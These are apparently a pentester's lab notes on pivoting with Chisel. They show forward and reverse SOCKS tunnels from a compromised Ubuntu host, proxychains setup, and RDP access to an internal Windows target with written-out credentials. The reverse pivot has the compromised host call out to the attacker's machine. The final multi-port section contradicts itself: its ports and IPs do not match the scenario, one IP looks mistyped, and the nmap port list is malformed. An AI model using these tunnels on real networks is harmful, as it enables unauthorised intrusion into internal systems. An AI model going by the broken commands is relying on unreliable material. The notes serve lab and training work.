---
title: "Port Forwarding with Chisel"
---


# Scenario for Reference

```python

Kali 
- tun0 / 10.10.15.115

Ubuntu-Pivot 
-  ens192 / 10.129.110.16
-  ens224 / 172.16.5.129

Windows-Unreachable-Target
-  172.16.5.19
```

## Set Up Chisel

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

---


## Transferring & Running Chisel binary on Pivot Host

```python

# Kali
scp -r chisel ubuntu@10.129.110.16:/home/ubuntu
ssh ubuntu@10.129.110.16

# Ubuntu-pivot
./chisel.server -v -p 1234 --socks5
"-> Chistel now listens on incoming connecection on port 1234 using SOCKS5 and will forward all traffic to all networks (interfaces) connected on the machine "


# Kali 
./chisel client -v 10.129.110.16:1234 socks
"The output will display the listening port that the client has initiated (tun: proxy#127.0.0.1:PORT<1080>=>socks: Listening)"

sudo nano /etc/proxychains4.conf
"socks5 127.0.0.1 1080"

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

```

---

## Chisel Reverse Pivot

> When Inbound traffic to pivot-host-ubuntu is blocked

```python
# Kali
sudo ./chisel server --reverse -v -p 1234 --socks5

# Ubuntu-p
./chisel client -v 10.10.15.115:1234 R:socks

# Kali
sudo nano /etc/proxychains4.conf
"socks5 127.0.0.1 1080"

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---


# Multiple Local PortForwarding

## Scenario

```python
+ kali: 192.168.45.112
+ Target (Windows): 19.168.205.95

The target is running 3 services locally on ports 15432, 18005, 32000.
We want to access these ports from kali
```
```bash
# Kali
./chisel server --reverse --port 8810

# Windows
chisel_windows.exe client 192.168.49.116:8810 R:49673:127.0.0.1:49673 R:49674:127.0.0.1:49674 R:49675:127.0.0.1:49675

```

# NMAP
```bash
sudo nmap -nvv -Pn --open -p 15432, 18005, 32000 127.0.0.1
```
